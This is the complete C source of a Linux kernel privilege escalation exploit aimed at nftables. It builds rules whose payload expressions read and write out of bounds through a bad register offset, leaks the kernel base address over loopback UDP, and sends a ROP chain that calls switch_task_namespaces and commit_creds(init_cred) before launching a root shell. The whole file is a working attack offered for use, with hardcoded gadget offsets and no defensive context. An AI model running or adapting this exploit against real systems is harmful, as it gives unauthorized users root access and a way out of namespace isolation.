#define _GNU_SOURCE
#include <arpa/inet.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include "utils.h"

#define LEAK_PORT 31337
#define STORE_PORT 31338

#define REGS (0xFFFFFFD6 + 4)
#define LEN (0xF8)

#define POP_RAX 0x047941
#define POP_RDI 0x0a4f20
#define POP_RSI 0x0fd61e
#define POP_RDX 0x066a40
#define POP_RBP 0x000802
#define CLI 0x015ca0
#define ADD_RSP_0x48_POP_RBP 0x0cf202
#define POP_RBX_R12_R13_R14_R15_RBP 0x010001bb
#define CMP_EBP_EAX 0x319f17
#define MOV_RDI_RAX \
  0x625d74  // mov rdi, rax ; jne 0xffffffff81625d61 ; xor eax, eax ; ret
#define INIT_CRED 0x01e8a2a0
#define INIT_NSPROXY 0x01e8a060
#define COMMIT_CREDS 0x0e74a0
#define BPF_GET_CURRENT_TASK 0x217de0
#define SWITCH_TASK_NAMEPACES 0x0e5c80

static unsigned short port;
static size_t rop_index;

void make_rop(char *buf, unsigned long long val) {
  *(unsigned long long *)(buf + 8 * rop_index) = val;
  ++rop_index;
}

static struct nftnl_rule *isolate_udp_pkt_for_leak(uint8_t family,
                                                   const char *table,
                                                   const char *chain,
                                                   const char *target_chain) {
  struct nftnl_rule *r = NULL;

  r = nftnl_rule_alloc();
  if (r == NULL) {
    perror("OOM");
    exit(EXIT_FAILURE);
  }

  nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
  nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
  nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

  // meta load l4proto => reg 1
  add_meta(r, NFT_META_L4PROTO, NFT_REG_1);
  const unsigned int protocol_type = (17);
  // cmp eq reg 1 0x00000017 == UDP
  add_cmp(r, NFT_REG_1, NFT_CMP_EQ, &protocol_type, 4);
  // payload load 2b @ transport header + 2 => reg 1
  add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0, NFT_REG_1, 2, 2);
  const unsigned short port =
      0x697A;  // Make network byte order (original = 0x7A69)
  // cmp eq reg 1 0x7A69 == 31337
  add_cmp(r, NFT_REG_1, NFT_CMP_EQ, &port, 2);
  // jump target_chain
  add_verdict(r, NFT_GOTO, target_chain, 0);

  return r;
}

static struct nftnl_rule *isolate_udp_pkt_for_store(uint8_t family,
                                                    const char *table,
                                                    const char *chain,
                                                    const char *target_chain) {
  struct nftnl_rule *r = NULL;

  r = nftnl_rule_alloc();
  if (r == NULL) {
    perror("OOM");
    exit(EXIT_FAILURE);
  }

  nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
  nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
  nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

  // meta load l4proto => reg 1
  add_meta(r, NFT_META_L4PROTO, NFT_REG_1);
  const unsigned int protocol_type = (17);
  // cmp eq reg 1 0x00000017 == UDP
  add_cmp(r, NFT_REG_1, NFT_CMP_EQ, &protocol_type, 4);
  // payload load 2b @ transport header + 2 => reg 1
  add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0, NFT_REG_1, 2, 2);
  const unsigned short port =
      0x6A7A;  // Make network byte order (original = 0x7A6A)
  // cmp eq reg 1 0x7A6A == 31338
  add_cmp(r, NFT_REG_1, NFT_CMP_EQ, &port, 2);
  // jump target_chain
  add_verdict(r, NFT_GOTO, target_chain, 0);

  return r;
}

static struct nftnl_rule *drop_udp_data(uint8_t family, const char *table,
                                        const char *chain) {
  struct nftnl_rule *r = NULL;

  r = nftnl_rule_alloc();
  if (r == NULL) {
    perror("OOM");
    exit(EXIT_FAILURE);
  }

  nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
  nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
  nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

  add_verdict(r, NFT_RETURN, 0, 0);

  return r;
}

static struct nftnl_rule *leak_kernel_into_udp_data(uint8_t family,
                                                    const char *table,
                                                    const char *chain) {
  struct nftnl_rule *r = NULL;

  r = nftnl_rule_alloc();
  if (r == NULL) {
    perror("OOM");
    exit(EXIT_FAILURE);
  }

  nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
  nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
  nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

  add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, (REGS), 0, 8, LEN);
  // add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, (0xFFFFFFDA), 0, 8, 0xf8);

  return r;
}

static struct nftnl_rule *store_udp_data_into_kernel(uint8_t family,
                                                     const char *table,
                                                     const char *chain) {
  struct nftnl_rule *r = NULL;

  r = nftnl_rule_alloc();
  if (r == NULL) {
    perror("OOM");
    exit(EXIT_FAILURE);
  }

  nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
  nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
  nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

  add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0, (REGS), 8, LEN);
  // add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0, (0xFFFFFFDA), 8, 0xf8);

  return r;
}

void install_rule() {
  if (create_rule(isolate_udp_pkt_for_leak(NFPROTO_IPV4, "filter", "input",
                                           "leak")) == 0) {
    perror("error creating rule");
    exit(EXIT_FAILURE);
  }
  if (create_rule(isolate_udp_pkt_for_store(NFPROTO_IPV4, "filter", "input",
                                            "store")) == 0) {
    perror("error creating rule");
    exit(EXIT_FAILURE);
  }
  if (create_rule(drop_udp_data(NFPROTO_IPV4, "filter", "drop")) == 0) {
    perror("error creating rule");
    exit(EXIT_FAILURE);
  }
  if (create_rule(leak_kernel_into_udp_data(NFPROTO_IPV4, "filter", "leak")) ==
      0) {
    perror("error creating rule");
    exit(EXIT_FAILURE);
  }
  if (create_rule(
          store_udp_data_into_kernel(NFPROTO_IPV4, "filter", "store")) == 0) {
    perror("error creating rule");
    exit(EXIT_FAILURE);
  }
}

void udp_client(void *data, size_t length_of_data) {
  int sockfd;
  struct sockaddr_in serverAddr;

  // Create socket
  sockfd = socket(AF_INET, SOCK_DGRAM, 0);

  // Initialize server address structure
  memset(&serverAddr, 0, sizeof(serverAddr));
  serverAddr.sin_family = AF_INET;
  serverAddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);  // Connect to localhost
  serverAddr.sin_port = htons(port);

  // Send data to the server
  sendto(sockfd, data, length_of_data, 0, (struct sockaddr *)&serverAddr,
         sizeof(serverAddr));

  // Close the socket
  close(sockfd);
}

void udp_server(void *data) {
  int sockfd;
  struct sockaddr_in serverAddr, clientAddr;
  socklen_t addr_size;

  // Create socket
  sockfd = socket(AF_INET, SOCK_DGRAM, 0);

  // Initialize server address structure
  memset(&serverAddr, 0, sizeof(serverAddr));
  serverAddr.sin_family = AF_INET;
  serverAddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);  // Listen on localhost
  serverAddr.sin_port = htons(port);

  // Bind the socket to the specified address and port
  bind(sockfd, (struct sockaddr *)&serverAddr, sizeof(serverAddr));

  addr_size = sizeof(clientAddr);
  // Receive data from the client
  ssize_t bytesRead = recvfrom(sockfd, data, 0x400, 0,
                               (struct sockaddr *)&clientAddr, &addr_size);

  // Close the socket
  close(sockfd);

  return 0;
}

int main(int argc, char *argv[]) {
  int tid, status;
  pthread_t p_thread;
  unsigned char udpbuf[512] = {
      0,
  };
  unsigned long long kernel_base = 0;

  new_ns();

  system("ip link set lo up");

  printf("[+] setup nftables\n");

  if (create_table(NFPROTO_IPV4, "filter", false) == 0) {
    perror("error creating table");
    exit(EXIT_FAILURE);
  }

  if (create_chain("filter", "input", NF_INET_LOCAL_IN) == 0) {
    perror("error creating chain");
    exit(EXIT_FAILURE);
  }

  if (create_chain("filter", "drop", 0) == 0) {
    perror("error creating chain");
    exit(EXIT_FAILURE);
  }

  if (create_chain("filter", "leak", 0) == 0) {
    perror("error creating chain");
    exit(EXIT_FAILURE);
  }

  if (create_chain("filter", "store", 0) == 0) {
    perror("error creating chain");
    exit(EXIT_FAILURE);
  }

  install_rule();

  // Leak Kernel base
  printf("[+] Leak kernel base address\n");
  printf("  [+] install udp server\n");

  port = LEAK_PORT;
  tid = pthread_create(&p_thread, NULL, udp_server, (void *)udpbuf);
  if (tid < 0) {
    perror("thread create error : ");
    exit(0);
  }

  printf("  [+] send & recv udp packet\n");

  usleep(1000);
  memset(udpbuf, 0x11, LEN);
  udp_client(udpbuf, LEN);

  pthread_join(p_thread, (void **)&status);

  kernel_base = *(unsigned long long *)udpbuf - 0xAA3B63;
  printf("  [+] kernel base address %p\n", kernel_base);

  // Set RIP
  printf("[+] Build ROP\n");
  printf("  [+] install udp server\n");

  port = STORE_PORT;
  tid = pthread_create(&p_thread, NULL, udp_server, (void *)udpbuf);
  if (tid < 0) {
    perror("thread create error : ");
    exit(0);
  }

  printf("  [+] send & recv udp packet\n");

  usleep(1000);

  // Make ROP
  // ==[ PAYLOAD ]==
  // END __do_softirq
  // rax = bpf_get_current_task()
  // mov rdi, rax
  // pop rsi
  // init_nxproxy
  // switch_task_namespaces(rdi, rsi)
  // pop rdi
  // init_cred
  // commit_creds(rdi)
  // RETURN to original ret
  // ==[ PAYLOAD ]==
  rop_index = 0;
  make_rop(udpbuf, kernel_base + CLI);
  make_rop(udpbuf, kernel_base + POP_RBP);
  make_rop(udpbuf, kernel_base + 0x230367 + 0x44);  // 0x400100
  make_rop(udpbuf,
           kernel_base + 0x0100017e);  // <__do_softirq+382>: add DWORD PTR
                                       // gs:[rip+0x7e01f9f7],0xffffff00 #
                                       // 0x1fb80 <__preempt_count>
  for (int i = 0; i < 0x58 / 0x8; ++i) make_rop(udpbuf, 0x00);
  make_rop(udpbuf, kernel_base + BPF_GET_CURRENT_TASK);
  make_rop(udpbuf, kernel_base + CMP_EBP_EAX);
  make_rop(udpbuf, kernel_base + MOV_RDI_RAX);
  make_rop(udpbuf, kernel_base + POP_RSI);
  make_rop(udpbuf, kernel_base + INIT_NSPROXY);
  make_rop(udpbuf, kernel_base + SWITCH_TASK_NAMEPACES);
  make_rop(udpbuf, kernel_base + POP_RDI);
  make_rop(udpbuf, kernel_base + INIT_CRED);
  make_rop(udpbuf, kernel_base + COMMIT_CREDS);
  make_rop(udpbuf, kernel_base + ADD_RSP_0x48_POP_RBP);

  udp_client(udpbuf, LEN);

  pthread_join(p_thread, (void **)&status);

  system("/bin/sh");

  return 0;
}